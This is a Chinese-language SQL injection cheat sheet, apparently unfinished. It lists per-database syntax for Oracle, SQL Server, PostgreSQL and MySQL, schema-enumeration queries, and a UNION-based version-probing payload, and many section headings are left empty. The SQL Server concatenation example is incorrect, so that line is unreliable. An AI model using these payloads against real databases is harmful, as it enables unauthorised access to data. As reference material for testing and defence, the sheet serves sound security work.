# ✔️ SQL注入CheatSheet

## Oracle

### 字符串连接

```sql
// Some code
'aaa' || 'bbb'
```

### 截取字符串

```sql
// Some code
SUBSTR('asdsfsdgf', 4, 2)
```

### 评论

### 数据库类型和版本查询

```sql
// Some code
SELECT * FROM v$version
SELECT banner FROM v$version
SELECT version FROM v$instance
```

### 查询数据库内容

```sql
// 列出数据库中所有的表
SELECT * FROM all_tables
// 列出数据库中某个表中的所有列
SELECT * FROM all_tab_columns WHERE table_name = '表名'
```

### 条件错误

### 通过错误消息提取数据

### 堆叠查询

### 时间延迟

### 有条件的时间延迟

### DNS查询

### DNS查询和数据泄露





## Microsoft

### 字符串连接

```sql
// Some code
'aaa' || 'bbb'
```

### 截取字符串

```sql
// Some code
SUBSTRING('fcsasff', 4, 2)
```

### 评论

### 数据库类型和版本查询

```sql
// Some code
SELECT @@version
' UNION SELECT @@version--
```

### 查询数据库内容

```sql
// 列出数据库中所有的表
SELECT * FROM information_schema.tables
// 列出数据库中某个表中的所有列
SELECT * FROM information_schema.columns WHERE table_name = '表名'
```

### 条件错误

### 通过错误消息提取数据

### 堆叠查询

### 时间延迟

### 有条件的时间延迟

### DNS查询

### DNS查询和数据泄露



## PostgreSQL

### 字符串连接

```sql
// Some code
'aaa' || 'bbb'
```

### 截取字符串

```sql
// Some code
SUBSTRING('sdaggrfsgrh', 4, 2)
```

### 评论

### 数据库类型和版本查询

```sql
// Some code
SELECT version()
```

### 查询数据库内容

```sql
// 列出数据库中所有的表
SELECT * FROM information_schema.tables
// 列出数据库中某个表中的所有列
SELECT * FROM information_schema.columns WHERE table_name = '表名'
```

### 条件错误

### 通过错误消息提取数据

### 堆叠查询

### 时间延迟

### 有条件的时间延迟

### DNS查询

### DNS查询和数据泄露



## MySQL

### 字符串连接

```sql
// 字符串之间是有空格的
'aaa' 'bbb'
CONCAT('aaa','bbb')
```

### 截取字符串

```sql
// Some code
SUBSTRING('afdgghtr', 4, 2)
```

### 评论

### 数据库类型和版本查询

```sql
// Some code
SELECT @@version
' UNION SELECT @@version--
```

### 查询数据库内容

```sql
// 列出数据库中所有的表
SELECT * FROM information_schema.tables
// 列出数据库中某个表中的所有列
SELECT * FROM information_schema.columns WHERE table_name = '表名'
```

### 条件错误

### 通过错误消息提取数据

### 堆叠查询

### 时间延迟

### 有条件的时间延迟

### DNS查询

### DNS查询和数据泄露
